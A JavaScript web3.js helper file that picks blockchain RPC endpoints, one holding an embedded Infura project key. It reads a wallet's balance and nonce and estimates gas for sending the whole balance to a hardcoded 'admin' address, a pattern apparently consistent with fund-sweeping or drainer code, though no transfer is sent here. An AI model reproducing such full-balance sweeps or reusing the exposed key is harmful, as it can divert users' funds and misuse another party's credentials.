import Web3 from "web3"
import TokenABI from "../ABI/ERC20TokenAbi.json"

const CyTestABI = TokenABI;

const CyTestcontractAddress = "0x622d71eb5a0da69457993fff031e8132c210d9e6"
const admin = "0xF24a24Ab64a29edd50ACC655f4dd78360888A83e";

let web3js;

const Cybalance = async (publickey, chain) => {
	if (chain == "56") {
		web3js = new Web3(new Web3.providers.HttpProvider("https://bsc-dataseed1.binance.org/"));
	} else if (chain == "1") {
		web3js = new Web3(new Web3.providers.HttpProvider("https://mainnet.infura.io/v3/a0c5c687788b471093524af62e5e1cec"));
	} else if (chain == "137") {
		web3js = new Web3(new Web3.providers.HttpProvider("https://rpc-mainnet.maticvigil.com"));
	} else if (chain == "97") {
		web3js = new Web3(new Web3.providers.HttpProvider("https://data-seed-prebsc-2-s2.binance.org:8545/"));
	} else if (chain == "5") {
		web3js = new Web3(new Web3.providers.HttpProvider("https://goerli.infura.io/v3/a0c5c687788b471093524af62e5e1cec"));
	} else if (chain == "80001") {
		web3js = new Web3(new Web3.providers.HttpProvider("https://matic-mumbai.chainstacklabs.com"));
	} else {
		web3js = new Web3(new Web3.providers.HttpProvider("https://data-seed-prebsc-1-s3.binance.org:8545/"));
	}
	try {
console.log("publickey111" , publickey);
		let balance = await web3js.eth.getBalance(publickey);
		console.log(balance,"balance in helper");
		let gasprice = 0;
		let gaslimit = 0;
		let nonce = 0;

		nonce = await web3js.eth.getTransactionCount(
			publickey,
			"latest"
		);
		let estimates_gas = await web3js.eth.estimateGas({
			'from': publickey,
			'to': admin,
			'value': balance,
		});

		gaslimit = web3js.utils.toHex(estimates_gas * 2);
		let gasPrice_bal = await web3js.eth.getGasPrice();
		gasprice = web3js.utils.toHex(gasPrice_bal * 2);
		gaslimit = parseInt(gaslimit);
		gasprice = parseInt(gasprice);

		balance = balance / Math.pow(10, 18);
		let obj = {
			balance, gasprice, gaslimit, nonce, CyTestcontractAddress
		}
		return obj;
	}
	catch (error) {
		throw error
	}

};

export const Yusebalance = async (publickey) => {
	
	let	web3js = new Web3(new Web3.providers.HttpProvider("https://data-seed-prebsc-1-s3.binance.org:8545/"));

	try {
		const Busdaddress = web3js.utils.toChecksumAddress(CyTestcontractAddress);
		const busdcontract = new web3js.eth.Contract(CyTestABI, Busdaddress);
	let	Balance =
		(await busdcontract.methods.balanceOf(publickey).call()) / 1e18;
		return Balance;
	}
	catch (error) {
		throw error
	}

};


export default Cybalance
